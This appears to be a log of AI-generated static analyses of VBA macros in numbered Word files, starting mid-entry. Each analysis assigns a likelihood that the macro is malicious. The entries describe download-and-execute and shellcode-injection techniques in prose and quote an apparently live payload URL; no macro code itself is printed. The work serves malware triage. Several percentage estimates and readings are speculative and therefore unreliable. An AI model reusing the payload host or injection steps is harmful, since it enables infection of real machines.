Note: Despite these signs, it's also important to note that none of the individual components in this code are inherently malicious. The suspicion primarily arises from their typical usage in malicious scripts. For a concrete determination, additional context or a runtime analysis would be needed. This analysis is a mere static analysis based on what is visibly suspicious about the code.
================================================================================

File: 32.docm
GPT's analysis:
Reviewing the VBA code, there are several activities that suggest the potential for harmful actions:

1. The use of the `ShellExecute` function from `shell32.dll`: This function can be used to execute a file or an application's functionality, and in the context of this code, it runs commands given by the online text file that's fetched from the mentioned URL.

2. Internet communication: The code connects to a specific external URL to fetch the text file (`https://usamyforever.azureedge.net/fmnfieikfemsdfdssdf/fjafisisafeg54/excel.txt`). This could potentially be used to download harmful content.

3. The use of the `AutoOpen` subroutine: This is a predefined VBA subroutine that executes as soon as the Word document is opened. This can be seen as a crafty way to execute malicious code before a user even gets a chance to look at the file content.

4. The function `IsUserAnAdmin` is declared but not used within the VBA code. This could potentially be used in a malicious context where the macro checks for admin privileges, but since it's not used, its threat level can't be determined just by its declaration.

5. Obscured code flow: The code appears to somewhat obfuscate its actual operations, which is a common characteristic of malicious scripts. For example, fetching and deciphering values from the internet, weird naming of variables, etc.

Although the intention of the code cannot be entirely sure without the context, based on the review, this macro has a 90% likelihood to be malicious due to its suspicious features. Running internet-based commands on shell, auto-opening, fetching external resources without clear use, are all suspicious activities. However, a complete certainty can only be given by executing it in a controlled environment and observing its behavior. Always exercise caution when dealing with macros from an untrusted source. A good security practice is to keep macros disabled by default.
================================================================================

GPT's analysis:
This script appears to be quite suspicious and potentially harmful. Here's a brief explanation of some components:

1. CustomXMLParts: This script interacts with the CustomXMLParts, possibly to extract sensitive data or information. 

2. Strings conversion: The function rrhzspxkphvvy seems to be converting strings, possibly obfuscating real strings to evade detection mechanisms. 

3. Writing files and executing: It is also trying to write some binary content into a file with "raeozmfjnymq" method and then possibly execute it. 

4. ActiveDocument: The code accesses the active document, which indicates that it may be reading or manipulating the content of the user's currently-opened Word file. 

5. Randomize: The use of a "Randomize" statement, which could be used to alter the script's behavior and make it harder for security tools to detect consistent patterns. 

6. GetObject: The "GetObject" statements can serve to create instances of an OLE object, potentially giving it access to system applications.

7. Spawn instance: A "SpawnInstance" is used which indicates that it may be creating a new process or application.

Concluding, without getting into the depth of what exact payload is being written (because the strings appear to be obfuscated), based on the given functions and behaviors, the given script seems to be malicious. I would rate the possibility of malicious intent as approximately 80%. 

It is recommended to limit these kind of scripts executing as macros in Word documents, especially if obtained from an untrusted source.
================================================================================

File: 118.docm
GPT's analysis:
This VBA macro code contains clear indicators of malicious activity. 

- In the beginning, we see a function (XorC) to XOR encrypt/decrypt a string with a key, indicating that it attempts to obfuscate its processes. This kind of function is often in malware to "hide" malicious strings in code.
 
- The function XorC appears to be called with encrypted strings, which may mean that malicious actions are obscured. 

- The Sub "CallP" is attempting to copy a file to a system's temporary folder. This shows that it is attempting to write to the system disk. Also, later it appears to be trying to execute a process, which is a common way for a virus or other malicious software to infect a system. 

- The Sub "SetCont" is fetching a text file from a suspicious URL and then inserts the potentially hazardous data into the ActiveDocument's content, which has implications for phishing or injection attacks.

- The Document_Open() function ensures that these actions are performed the moment the containing document is opened, ensuring that the payload is delivered immediately.

Therefore, based on these findings, I would estimate the potential harm of this code to be around 90-95%. The readout markers for obfuscation, remote file retrieval and execution, and auto-running the code are all typically associated with malware practices. Nevertheless, the full impact is dependent on the decrypted instructions and the content of external files it downloads.
================================================================================

File: 52.docm
GPT's analysis:
The provided VBA code contains characteristics which can be considered potentially harmful:

1. There's an attempt to manipulate files (`FileDialog`), which is often a characteristic of a potentially malicious application. 

2. The function `dgfjalfhkaugwikgfuol3wgnacoi3u5taboi3ut5roai3u5go3wugaolisdrgfso8i7wejwdoljgf` seems to be obfuscated and it includes creating an object of "Wscript.Shell" and using the "Run" method which can execute arbitrary commands on the system. Also, it looks like it's constructing a PowerShell command to fetch some data from a list of URLs.

3. It also opens a binary file (`Open hskld For Binary As #1`) which could assist in file manipulation or an attempt to conceal actions via binary data.

4. The `Document_Open` sub makes this code run as soon as the document is opened. This is found commonly in malicious macros used for attack techniques such as phishing.

Based on these points, there's a high chance (approximately 90%) that this VBA code may be malicious. However, as an IT security analyst, thorough and further investigations are always recommended to definitively determine if it's truly malicious or if these are just unusual programming tactics.
================================================================================

File: 95.docm
GPT's analysis:
The VBA (Visual Basic for Applications) code appears to be potentially dangerous and possibly malicious with an estimated chance of 90%.

Several risk factors of this code include:

1. Usage of the "Shell" command: This command executes a program in a new process, and could be used for malicious activities such as launching unwanted programs or commands, including malware.

2. The "HealthCheck" subroutine deals with File handling. It opens a binary file, modifies it and then closes it. This can be potentially harmful as it can be used to manipulate or damage important files on the system.

3. The function "SwitchSides" performs byte manipulation, which is often found in suspicious code as it may be used to decrypt encoded harmful payloads.

4. The inclusion of strange hard-coded strings such as "166157191179213210202213196208167196215196191219219219145199207207" and "213216209199207207150149131" which may be deobfuscated to perform unintended activities.

5. The Document_Open() function, which runs when the document is opened, can trigger all the potentially malicious activities immediately upon opening the document.

All of these factors combined indicate a high likelihood of malicious intent in this VBA code. Please note that this is only a cursory analysis and might require further deep inspection by IT security professionals.

GPT's analysis:
The provided VBA code snippets are not inherently malicious. They detail the attributes of a VBA Document and a Module in a Word document VBA project, and a Sub procedure in the Module creating a table of contents in the Word document. The code does not include any suspicious activities like writing/reading files from suspicious locations, calling unsafe native API, downloading/executing files from the web, or manipulating data without user consent. The pretty harmless actions limit chances of it being a part of malicious code. 

So, as an IT security analyst, I would say there is 0 ~ 1% chance that this code could be malicious. To be sure, further analysis must be done on the rest of the code, if available. Any code, even if benign, could be used as part of a larger malicious macro in a different context.

File: 26.docm
GPT's analysis:
The VBA code here is highly likely to be malicious with a confidence level of around 85-95%. 

Here's a breakdown of the malicious activities found in the script:

1. It attempts to download and save files from the internet using URLs linked to "enhanced-google.com". This site is not a genuine Google URL, which is suspicious. The files it attempts to download includes a CPL (Control Panel item), an EXE (executable file), and a VBScript, which can all be used in different forms of malicious activities.
   
2. It calls a ShellExecute function to open a URL (https://pge.com). This is not necessarily harmful on its own, but combined with the other activities shows a pattern of untrustworthy behavior.
   
3. It is designed to interact with system directories (C:\ProgramData\AxlnstSV) and create new ones, which could be used to hide downloaded files.

4. It runs commands using "cmd.exe /S /K" with "rundll32.exe" which is often used to launch DLL files. The use of Rundll32 is considered a technique that many threats use to bypass detection and escalate privileges because Rundll32 is a legitimate Microsoft binary. 

5. It does not explicitly appear to be self-propagating, nor is it using an exploit, but it does silently create subdirectories and downloads files without user's consent, which is suspicious behavior.

Overall this macro appears to be designed to download and run potentially harmful scripts from the internet, it interacts with system directories, and runs system commands which can be utilized to gain elevated privileges.
================================================================================

GPT's analysis:
Upon analyzing the given VBA (Visual Basic for Applications) code, several suspicious aspects are observed:

1. The code contains the function 'CreateObject', which is typically used to create instances of an object under Microsoft Windows. In this case, it is used to create UserForms, and this can potentially be used to download other harmful objects onto the system, which can lead to malicious behavior.

2. The function 'CallByName' is used in this code. This function is used to execute a method of an object or to set or return a property of an object using a string. It's often used in malicious macros because it can obfuscate the intent of the macro, making the macro harder for security products to detect.

3. The code involves actions that suggest it is trying to open a file and retrieve specific cell values. This indicates that it may be looking to extract information from these files. 

4. The use of the ‘Workbooks.Open’ to open a password-protected file suggests an attempt to bypass the protective measures of the said file.

5. There are also instances of the "On Error Resume Next" statement that suppresses errors, allowing the code to continue running even if an error occurs.

Based on these observed activities and without additional context, a neutral percentage cannot be provided. The use of these functions and activities does not always mean that the code is harmful; they might be necessary for the normal functioning of an application. However, they do raise suspicions as they can be potentially misused. 

If these actions aren't necessary for the expected behavior of your software, it is advisable to investigate this code further. It is strongly recommended to seek a security professional's assistance to verify whether this code is indeed malicious.

GPT's analysis:
The VBA code given here demonstrates several suspicious activities that are often associated with malware-based attacks. Here's an analysis:

1. Use of obfuscated function and variable names: The code employs function names and variable names that appear to be randomly generated and obfuscated, a common tactic to make the code harder to understand and analyze.

2. Detection evasion: The code checks for the existence of a file named ".gattaka". This can be an attempt to detect certain environment to avoid execution, possibly a sandbox or a specific security tool.

3. Document Manipulation: The code manipulates document content using `ActiveDocument.CustomXMLParts`, which can be used to hide or extract sensitive data.

4. Use of "GetObject" and "Create" methods: The methods are used to create a new process or to trigger an existing one, often used by malware for execution of malicious scripts or other payloads.

5. File Operation: The function `raeozmfjnymq` is working with binary files. This indicates that it might be used for dropping malicious payloads.

6. Use of constant strings that appear to be encoded or encrypted: The values such as "166157191179213210202213196208167196215196191", "218204209208202208215214157222204208211200213214210209196215204210209175200217200207160204208211200213214210209196215200224132191191145191213210210215191198204208217149", "186204209150149194179213210198200214214182215196213215216211" might be encrypted or encoded db connection strings, commands, or other sensitive information.

Based on these points examination and complex obfuscation, I would estimate the code to be 90% likely to be malicious.

Analyzing the given VBA (Visual Basic for Applications) code, it primarily shows two main functions: the generation/updating of a barcode and the printing of the current document. It does not include any harmful commands such as unwanted data deletion, unauthorized system access, user data collection, network penetration, etc.

The script appears to be designed to update a barcode that is likely embedded within the Word document each time the document is printed. It has a simple functionality of incrementing a number (which could be a tracking number, for instance) each time the document is printed. This could be useful in various ways, for instance, in an office that uses this document regularly and wants to keep track of how many times it was printed.

However, without the context and surrounding usage, it is not absolutely conclusive that this is the entire script and that it lacks any harmful functionalities.

Based purely on this code snippet, I would estimate that there's a 0% chance that this code could be malicious in nature. As an IT security analyst, however, it is recommended to continue observing the surrounding context and any associated scripts or executables and never to dismiss the potential of a seemingly harmless piece of code. Also, ensuring this script doesn't get changed or updated without verification can help protect against future potential risks.
================================================================================

File: 28.docm
GPT's analysis:
The code provided seemingly represents a malicious Visual Basic for Applications (VBA) macro embedded within a Word document. This VBA macro uses Windows API functions to perform its actions. Here's what it does:

1. It uses the `RunStuff` function to run the `rundll32.exe` process from the System32 or SysWOW64 directory (based on the system's architecture). `rundll32.exe` is a legitimate Windows process used to load DLL files into memory, but it can be misused by malicious programs.

2. It creates an executable space in the `rundll32.exe` process memory using the `AllocStuff` function that corresponds to `VirtualAllocEx`, a Windows API function that reserves/commits a region of memory within the virtual address space of a specified process.

3. It writes a certain shellcode (stored in the `myArray` array) into that executable space in memory. The shellcode is written byte by byte using the `WriteStuff` function, which maps to `WriteProcessMemory`, another Windows API function.

4. Finally, it runs the written shellcode by creating a remote thread in the `rundll32.exe` process using the `CreateStuff` function that corresponds to `CreateRemoteThread`.

This code is definitely intended for malicious activities. It intends to run a shellcode within a legit Windows process, potentially to download/install malware or gain unauthorized access/control over the system. This kind of technique is a common evasion technique used by malware to avoid detection by security software.

I would estimate the likelihood of this code being malicious as 100%.
================================================================================

GPT's analysis:
Looking at this VBA code, there are several flags that indicate it's likely to be malicious:

1. Shell function calls: The Shell function runs a program in a new process, which is a common method used in malwares to execute malicious code or commands.

2. Obfuscated function and variable names: Legitimate code usually has meaningful and well-described names, whereas this code includes obscure and meaningless names, such as "KqxuCcjsSTmpoRODFWuiSCNcmUBBemrviIBKyHtoRkGsPcKHuoYbcFl" and "dfrKkKIdwZurVwLXGXpxIhZFBkyEjCaKBLnlNpadjCwpQnINjCbaNAo".

3. Character manipulation functions: The code employs functions such as Chr and Asc, as part of a decoding routine to de-obfuscate the string arguments fed into the Shell function calls.

4. Unknown strings: There are strings of text, likely obfuscated, that appear to be encoded or encrypted possibly for hiding malicious activities.

5. Environment variables: The code is making use of Environ function which can often be used to discover information about the environment in which it is running (e.g., directory paths, usernames) which can potentially be exploited.

As a security analyst, given the Shell function calls, obfuscated names, character manipulation, unknown strings, and use of environment variables, I would assess this VBA code to be 90% likely to be malicious in nature. Therefore, I strongly recommend to not execute this code and further investigate or dispose it securely.

GPT's analysis:
In this VBA code provided, it shows a simple script for a "search and replace" routine. This macro is looking for a specific text ("placeholder") in a Word document and replacing it with another text ("replacement text"). It then generates a message box telling you how many instances were replaced, or that no instances were found.

From an IT security perspective, there is no code here that aims to harm, corrupt, steal, or manipulate data beyond the 'search and replace' function parameters. There are no network communications, no file system interactions beyond the scope of the open Word document, and no suspicious obfuscations or secretive functionality.

However, any macro can be abused if it has malicious intentions. For example, if someone modified this code to replace innocent words with malicious values, it could potentially be harmful. Therefore, you should always ensure that you trust the source of the file and inspect it before running any macro. 

But based purely on the code provided here, I would assign this code a 0% likelihood of being inherently malicious. As a reminder, this doesn't consider the potential of someone manipulating the intent of the code to carry out harmful actions.

After reviewing the given VBA code, it's evident that the intention of this code is malicious, exhibiting signs of a Trojan horse. It leverages different system functionalities to perform potentially harmful actions, masking these behind benign procedures and functions.

Key bad practices and suspicious indicators include:
- Use of system-level objects like "Wscript.Shell" to execute commands can cause great damage, especially if they are controlled by an external malicious party.
- Calling HTTP-based resources, in this case to download files, could mean the download of malicious software and ensuing system infection.
- The combination of random string and filename generation with file download and system command execution hints at the delivery of a payload and potentially its execution.
- The code contains a lot of obfuscation techniques such as splitting and replacing strings to make its real purpose less clear.
- Using the `Document_Open` method to execute upon document open without the user's consent is a common technique used in malicious macros.
- Use of DLL file generation and execution within the script is a common way to load potentially malicious software or perform harmful system-level actions.

By analyzing these attributes, I must assert that this code is hazardous. Hence, the potential for malicious actions is approximately 90-100%. The exact impact on a particular system could depend on the system's configuration and existing protections, such as security software or restricted user rights.

However, this analysis would not be decisive deterministically. Engaging accredited security assessment professionals or employing automated security tools for further intrusive testing is recommended. Please notify your IT security department or responsible party to prevent unforeseen damage.

GPT's analysis:
This VBA code appears to be malicious. This determination is based on several factors present in the code:

- The use of CreateObject function suggests the code will be creating a new WScript.Shell object, typically used for running system-level commands. 
- The RegWrite method is used, which writes a value to the Windows registry. This is often seen in malware that tries to maintain persistence or alter system behaviors.
- It appears to be executing a command retrieved from the text contained in an embedded Shape within the document which could force the system to run potentially harmful commands.
- The function RangeToString seems like an attempt to harvest and concatenate the information from a range of cells which could include personal or sensitive data.

Based on these suspicions, there is a very high likelihood (approximately 90 to 100%) that this script is intended for malicious use. Note that the actual potential harm largely depends on the document content (i.e., the text contained in the document's shapes) and the user's privileges (i.e., whether the user has the necessary rights to alter the registry or run system level commands). Regardless, the presence of this code in a document should be treated as a serious security concern.
================================================================================

GPT's analysis:
The provided VBA code does not appear to be malicious. All scripts are simply manipulating Word documents by changing line spacing, adding a table with some sample data, and adding a watermark. There are no commands that would typically be seen in harmful code, like accessing the file system, network requests, or trying to obscure its functionality in any way.

Therefore, based on this analysis, the likelihood of this VBA code being malicious appears to be 0%. However, always be aware that even code that appears safe at first glance might still be harmful if used in specific contexts or combinations.

GPT's analysis:
After analyzing the provided VBA macro code, the following observations were made:

- The code reads data from text boxes on UserForms.

- The code functions to create directories and zip files in the "ALLUSERSPROFILE" directory.

- Specifically, it writes binary data to a zip file using data presumably obtained from UserForm1.

- It has the ability to extract the contents from the zip file created, keeping the potential for extracting and running malicious executable files.

- It also generates another zip file containing a ".docx" file, possibly of malicious intent, and extracts and opens it automatically.

- Additionally, the macro is triggered at the opening of the document, which means infection might happen before the user recognizes the potential danger.

Given these activities, it's highly likely the code may be part of a malicious activity like spreading Malware, possibly Ransomware or a Trojan, which often use these types of methods to infect target systems.

Without analyzing the binary data written to the created files, it's hard to comment on the exact nature of the potential malware. But given the nature of operations performed by this script (file extraction, running exe file), there is a high risk of it being a Malware dropper. 

Therefore, this macro appears to pose a high security risk and its threat level could be estimated at around 90%. Before proving benign nature all unknown macro codes should be treated as malicious. 

It is generally not recommended to enable macros in documents unless it is guaranteed that the document comes from a trusted source. 

*Note: It's recommended to use this estimate as a guidance and consult with a seasoned threat analyst for further in-depth investigation for accurate risk assessment and proper mitigation steps.*

File: 88.docm
GPT's analysis:
This VBA (Visual Basic for Applications) code looks suspicious from an IT Security standpoint. Its characteristics resemble those often found in macro malware, which primarily rely on VBA for executing their nefarious tasks. 

Its main characteristics raising security concern include:

- It contains obfuscated function and variable names, which can be a technique used by attackers to make the code's purpose less understandable.
- It uses specific functions that could potentially pose a security risk, like "GetObject" and Activating/Interacting with the Document_Open() event. These can be used to execute malicious actions when the document is opened.
- The "Dir" function is checking for the existence of ".gattaka", which may be a marker file used by the malicious code.
- The FreeFile, Open, and Put file interaction functions suggest the code may be attempting to modify files, potentially storing malicious content.
- Use of the CByte, CLng, and Rnd functions, and Randomize suggest possible encryption or obfuscation attempts, possibly to create or decode payloads.

Considering these factors, without the specific context and intention of this code, it appears to have a 70-80% chance of being potentially harmful. However, a thorough review of this code within its deployment context and runtime behavior analysis is strongly recommended to make a final decision. Be cautious that even parts that seem harmless might be part of a larger malicious scheme when interacting with the complete macro environment or other scripts.
================================================================================

File: 27.docm
GPT's analysis:
The given VBA (Visual Basic for Applications) code appears to utilize some suspicious techniques commonly used in malicious VBA documents. It uses obfuscated function names and complex function calls. The code is also using Scripting Dictionary objects for obfuscation purposes, and it checks for the existence of a file with the name ".gattaka", a suspicious file extension.

It also contains several functions that deal with file operations such as opening a binary file and writing to it. Notably, it appears to spawn a new instance with the 'SpawnInstance_' method and write data to the file system, commonly associated with malware's action for persistence or to deploy a more harmful payload. This indicates a possible scenario where a payload is extracted and written into the filesystem when the document is opened.

Another notable action is what appears to be an attempt to run obfuscated commands by creating and spawning instances, which is commonly associated with running harmful actions, like executing a malicious payload.

Based on the obfuscation level, presence of binary file operations, spawning instances, and potential payload extraction, it's fair to say that the code exhibits several red flags related to malicious activity. However, without the full context including the payloads and actions performed by parts of the script, it is not 100% guaranteed to be harmful.

With these aforementioned qualifications, I would estimate around 80% - 90% likelihood that this code could be used for malicious purposes. This means it should be treated with caution and investigated further before use. Please note that the actual risk can depend on the context of the script's use and the presence and intent of any included payloads.
================================================================================

GPT's analysis:
The VBA code contains several suspicious elements raising doubt about its intent. Most importantly, the use of CreateObject function is observed in multiple locations in different Modules. This function in VBA is used to create and manipulate instances of an Automation object and this can be dangerous if the script/code is being run to exploit a vulnerability because it generally interacts with system level objects.

The code also contains Subs and Functions for processing and manipulating data arrays which is normal, but it includes the use of Application.Evaluate function as well, which evaluates an expression and can be harmful if used maliciously.

One of the key suspicious activities is the Sub "CheckBins", where it's creating objects with different strings from array "hubabuba" (seems to be obfuscated/encrypted strings) and calling the function "crentips". 

"crentips" function decrypts a string by subtracting 1000 from each array value and converting to a character code which requires further in-depth analysis to understand the aim of decrypted string. Additionally, it's using a method to send requests out which is highly suspicious, possibly for command and control operations.

Based on the above analysis, there is indication that this code may be used to perform malicious activities, such as obtaining and executing remote code or exfiltrating data. Estimating its likelihood to be malicious is, however, not a straight forward affair from the given code snippets alone as due to its possible encryption and obfuscation techniques. Consequently, it's advised to execute this code in a sandboxed/test environment for complete understanding of its actions, potential network interactions and possible exploitation. However, from a static code analysis perspective, the provided VBA code is 85% likely to be malicious.
================================================================================

GPT's analysis:
The code provided appears to be a simple Word macro that converts selected text into a bulleted list. There are no evident malicious activities like file system access, network communication, process manipulation, or mysterious encoded strings that may suggest possible harmful actions. This suggests that the code is likely benign. However, it is important to keep in mind that even benign scripts can be used maliciously if deployed in the right context.

Hence, based on the given code, I would estimate less than 1% risk of it being potentially malicious, considering only the content of the code itself and not factoring in any external factors.
================================================================================

File: 36.docm
GPT's analysis:
The above VBA (Visual Basic for Applications) code seems to be clearly malicious. The code appears to be doing the following:

1. On opening a document, it is creating objects for `Microsoft.XMLHTTP` and `ADODB.Stream`. These are generally used for sending HTTP requests and stream handling, usually file downloads.

2. The URL from which it is downloading data is obscured by some form of obfuscation function (`mQsNMWCmsqUBsdAKlLddnnHmNVIUJnoQsMDZQAzDYpOCWlmzvXbNzvT`). The same function is used to obscure the name of the file being downloaded.

3. After downloading the file, it utilizes `WScript.Shell` to execute it. This means the downloaded file could be anything, specifically it could be a malicious executable which would further compromise the user’s machine.

4. The function `mQsNMWCmsqUBsdAKlLddnnHmNVIUJnoQsMDZQAzDYpOCWlmzvXbNzvT()` is a simple decryption function that subtracts 42 from the ASCII value of each character in a string. This function is typically used to obfuscate both the URL for malicious content download and the location where the downloaded content will be stored/executed.

In conclusion, the code is designed to download and run potentially harmful programs on a user's system. This is a common technique used in macros embedded in documents for malicious attacks. The likelihood of this code being malicious is 100%.
================================================================================

File: 123.docm
GPT's analysis:
This VBA macro code seems potentially harmful due to several suspicious activities after analyzing. 

1) It checks for the presence of a ".gitingore" file, this is possibly trying to determine whether it's operating within a git repository or not.

2) The 'SwitchSides' function appears to take a string and convert it to a byte. The 'dc' function seems to be a decoding function since a dictionary object is invoked in the 'prep_dc' function. 

3) It seems to convert coded strings into bytes and write those to a binary file with the 'HealthCheck' function.

4) The 'Shell' function call suggests that it's attempting to execute a command on the command-line. Presumably, the path and command being executed are concealed in coded strings.

5) There's an attempt to interact with custom XML parts of the active document which could be a potential way to import malicious content from another source.

Given these behaviours in the Macro; opening files, writing binary data, interacting with document's XML and trying to execute command-line instructions, all indicate that this code could do harmful actions depending on the strings that are being obscured and what the external XML content might contain.

Percentage estimate of malicious intent: 70%. However, the final assessment requires knowledge of what the decoded strings represent and what the binary data created is actually used for, as it could possibly be used for completely legitimate purposes also.
================================================================================

File: 31.docm
GPT's analysis:
The VBA code provided represents a security risk and has a high likelihood to be malicious, nearly 99%. Several irregularities and suspicious operations were identified that support this conclusion:

1. The code contains a substantial amount of obfuscated code which is a common technique used by attackers to hide harmful actions.

2. It's using techniques that open, read, and write files which could indicate it is creating, modifying, or examining data on the computer.

3. Many variables are named with random characters. This often indicated devious intent, as comprehensible names would help trace the code's purpose and use.

4. There is an attempt to interact with certain system level object like Scripting.Dictionary.

5. The Document_Open() and yoxtuitsmsvbjfepuxc() functions might be an attempt to automatically execute code upon some trigger events.

6. It checks for ".gattaka" in the document directory. This is suspicious and might be used as a command and control (C2) technique.

7. It's using CryptoAPI functions which indicate it may be encrypting data in some way. This can be used to hide other activities.

8. Messages for "Obsolete environment, please, update" and "Not applicable environment" give the impression this code was intended to be hostile.

Given these characteristics, the overall structure and functionality, suggest this code is meant to be malicious and perform unauthorized tasks on the user’s machine. Never run or execute such a script without full understanding of its operations and consequences.
================================================================================

File: 45.docm
GPT's analysis:
After analyzing this VBA code, it is almost certain (~100%) to be malicious.

Here's why:

1. The function `Document_Open()` is a common procedure utilized by malicious macros to automatically execute malicious code the moment the document is opened.

2. Inside `Document_Open()`, it seems to be decoding a Base64 string by calling the function `sadsad()`. The decoded Base64 string appears to be a PowerShell command.

3. The decoded PowerShell command is trying to download a file from a web server and then executes the downloaded file, commonly a tactic used in malicious scripts and phishing attacks.

4. In addition, the script is using `WScript.Shell` to run the command, which is commonly associated with malicious intent. 

5. The use of obfuscated function and variable names like `sadsad`, `asds` etc., indicates an attempt to hide its true purpose.

Overall, this script appears to be designed to download and execute potentially harmful files when the document is opened.
================================================================================

File: ll.docm
GPT's analysis:
The provided VBA (Visual Basic for Applications) code is for a macro in Microsoft Word. Upon analysing, it appears benign; it adds a custom footnote to the active document. There is no code that specifically harms the system, adjusts any settings without the user's knowledge, or manipulates files and data maliciously.

It doesn't appear to gather, modify, or transmit valuable/sensitive data. There are no signs of the script interacting with the file system, network, or attempting to obtain elevated privileges on the user's machine. No signs of info-stealers, ransomware, DDoS bots, or other common types of malware either.

If there is malicious activity concealed in this script, it might come from the contents of the custom footnote text (which here doesn't look harmful) or any payloads the macro might download from the internet (which this one doesn't seem to do).

However, it is critical to understand with macros, the potential for malicious intent exists. This is because they can access your system and perform actions without you even knowing. Besides, it's always important to consider potential indirect malicious scenarios, like the macro being a part of a more extensive operation, but this requires more context.

So based on this analysis, this VBA code's likelihood of being malicious would be approximately 0%. But remember that while this code snippet isn't inherently harmful, it doesn't mean that macros as a whole are entirely safe and should not be used carelessly. Always enable macros only for trusted documents and sources.
================================================================================

File: 102.docm
GPT's analysis:
Upon analysis of the VBA macro, it appears to contain several features that are indicative of potentially harmful or malicious actions:

1. The use of obfuscated function names and arbitrarily named variables: This makes it difficult for a casual observer to discern the macro's purpose. While not inherently harmful, it is generally associated with deceptive practices.

2. Checks for presence of a certain file (".gattaka"): Again, this isn't inherently harmful, but it's used in this way to conditionally execute code, which is suspicious.

3. Usage of "GetObject", "SpawnInstance_" and variable names similar to WMI: This is a usual method used for persistence and often seen in malware. 

4. Writing data to a binary file: The macro writes to a binary file via the "Put" statement. This operation is unusual and could be potentially harmful, especially if it's writing to a system or other sensitive file.

5. The macro includes several other suspicious operations, including the generation of random numbers, use of arrays, and suspicious string manipulations.

6. The code also tries to intimidate the user with Error message boxes.

While it's not immediately clear what the macro's exact purpose is, it carries out several actions that are associated with malware. Therefore, I would estimate that it is 85% likely to be malicious.

NB: This analysis should be complemented with static and dynamic analysis tools for further investigation. 

However, for an end user or a non-IT professional, the general guideline would be to not open macros, files, or links from an unknown or untrusted source.

GPT's analysis:
Based on the provided VBA macro code, it's apparent the code is designed to format tables in a Word document based on the user's selection. It applies a change in style, color theme, and page break preference to the selected tables and displays a message after successfully formatting each table.

There are no indications of any harmful or malicious activities such as copying user information, modifying unauthorized files, or connecting to external servers.

Therefore, we estimate a 0% chance of this code being malicious. However, a deeper audit, including where and how this macro code was sourced, should be performed to confirm this preliminary analysis.
================================================================================

File: 49.docm
GPT's analysis:
The VBA script given here is concerning due to multiple reasons:

1. The script contains two functions: ```ExecuteForWindows``` and ```ExecuteForOSX``` that execute arbitrary code passed to them. In the case of ```ExecuteForWindows```, the code is executed as an ```.exe``` file created within the special temporary folder. In ```ExecuteForOSX```, the code is executed using python.

2. Base64 encoded string is extracted from the document's metadata (from "Comments" property) and then is decoded and executed. Base64 is often used by attackers as a way to hide their intentions because it can encode binary data into printable ASCII characters, which are often less inspected.

3. It uses ```On Error Resume Next```, which means any error will not be displayed to the user. This is usually done to prevent users from noticing any malicious activity.

Therefore, this script has the potential to be harmful and it seems like it is designed to carry out malicious activities. It's taking encoded commands from the document's metadata and executing them without any safety checks, which is a big red flag. It has a 100% probability of being malicious. However, the extent of the potential damage can't be evaluated without knowing data stored in the document's metadata.
================================================================================

File: 69.docm
GPT's analysis:
The provided VBA code appears to be potentially malicious with a high certainty. The code appears to create an object and execute a method with a string which is acquired from the first hyperlink in the active Word document. Because any string could be passed this way, it may include malicious commands or scripts.

The excessive use of MsgBox calls, while commented, is unusual and might be an obfuscation attempt. The second module (ajnF) includes functions that piece together character literals to form commands and paths, which are signs of an attempt to bypass string-based detection by security software. 

The functions c1()-c11() are suspicious as they are creating strings in separate function calls before being combined into a larger string. This is a common technique to disguise malicious strings. Just by observing the sequence of the calls, 'TC2' for example, generates "winmgmts:Win32_Process".

Furthermore, the use of CreateObject and ExecMethod_ suggests the code may be creating and executing potentially harmful methods or processes at runtime which is a common characteristic of malicious macros.

Overall, based on the analyzed code, I would estimate that it is approximately 95% likely to be malicious because it extensively employs obfuscation strategies and hints at the execution of potentially harmful activities, although the accurate determination of its harm potential would require the exact specification of the string being passed and the environment in which it is being executed.
================================================================================

GPT's analysis:
As an IT security analyst, this code appears to be undergoing detailed analysis for potential harmful behaviors including execution of files, manipulation of data, file creation, and more. What increases suspicions about this code snippet are the use of "Shell", which might enable execution of system operations, and manipulation of custom XML parts which are normally used to store user-specific settings.

It cannot be 100% said to be malicious because it may be part of a legitimate program but the observations indicate potential malicious behaviors.

Thus, I estimate that the possibility of this being a malicious code at around 80%. It's important to further investigate the source of this code, and whether these actions are expected from its intended purpose or not. Additionally, ensure safe execution of this code by implementing least privilege rule, so that it cannot inflict major damages, if any.
================================================================================

File: 90.docm
GPT's analysis:
In the provided VBA code, there are several red flags that indicate potentially malicious behavior, including:

1. The use of "CreateObject" method that potentially indicates creation/shell of system objects. Which is used to execute programs or commands by items such as "VradManrDE(1), VradManrDE(2), VradManrDE(I - 2), VradManr1DASH_3(VradManrDE(6)), VradManr1DASH_1.responseBody".

2. The blocks of hard-coded character strings that seem to be obfuscated.

3. The use of "Sub SaveDocument", that can potentially record and send or save data which raises questions about any data collection that is taking place.

4. "AbnormalWindup()" function includes a potentially malicious code segment which connects to an external FTP server with username "super" and password "user". Then, it deletes files "/r0/set", "/r0/mf6407_*", "/r0/mf6411*", "/r0/setok", "/r0/setng".

5. A call to an "Open" function with the variable 'VradManr1_tolko1' might indicate opening or executing a file. 

6. The use of file operations that include deleting, writing and saving files possibly malicious manipulation.

Given these factors, I would estimate that this VBA code has a 90-95% chance of being harmful / considered as malware. However, to be sure, you should conduct further analysis, possibly with the help of antivirus software or a cybersecurity professional. As an analyst, without understanding the full context of the software it is involved with, a 100% guarantee cannot be given.

GPT's analysis:
Upon analyzing the provided VBA (Visual Basic for Applications) code, there are numerous signs that indicate this code is highly malicious.

The code is creating an XML HTTP request to download a file from a specific URL, then it's saving this file as a GIF in the system's Temp folder. After downloading the file, the script is then renaming the file extension from .gif to .exe making it an executable file.

Once the file is renamed to .exe, the script runs this executable file. This behavior is highly indicative of a downloader that retrieves a malware executable and runs it. The naming of the file as a GIF initially may be an attempt to circumvent defenses by making the download seem harmless.

Hence, based on the above analysis, there is a 100% chance that this VBA script is malicious in nature. The action of downloading a file from a specific URL, altering its format, and then proceeding to run it poses a significant security risk and matches known patterns of harmful behavior.
================================================================================

File: 25.docm
GPT's analysis:
The VBA code identified seems to be suspicious. Analyzing the core parts of the code:

1. Subroutine Document_Close() is defined which calls another subroutine txn(). 

2. Inside txn(), the code appears to change certain application options and contains error handling. It disables alerts using "Application.DisplayAlerts = False". This normally suppresses any error messages or alerts that might usually appear, masking any actions the subroutine is performing.

3. The code includes several references to manipulate ComboBox controls within various Userforms. This includes adding items, setting the value of the ComboBox, or even using the control in a CallByName method, which can perform a function or method using a string name. 

4. It is also opening workbooks and reading data from cells within the opened workbook. Furthermore, the code uses CallByName to create objects and perform methods possibly declared in the opened workbook. 

5. There are also several operations of adding controls programmatically to the UserForm from the Sheets data.

6. It does not seem to do any regular actions like providing any functional utility to the user, performing calculations, or formatting the workbook. 

